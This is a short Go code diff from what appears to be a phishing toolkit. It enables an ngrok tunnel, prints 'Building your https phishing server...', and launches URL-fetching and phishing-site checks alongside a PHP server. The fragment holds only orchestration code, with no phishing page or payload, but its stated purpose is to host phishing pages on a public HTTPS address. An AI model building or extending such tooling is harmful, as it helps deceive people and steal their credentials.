@@ -128,16 +128,19 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-	//ngrok, err := executeNgrok()
+	ngrok,  err := executeNgrok()
 	if err != nil {
 		panic(err)
 	}
 
-	go checkPhish(site)
+	fmt.Println("Building your https phishing server...")
+	go getURL()
 
+	go checkPhish(site)
 	fmt.Scanln()
 	//time.Sleep(30 * time.Second)
 
 	php.Process.Kill()
-	//ngrok.Process.Kill()
+	ngrok.Process.Kill()
+	fmt.Println()
 }
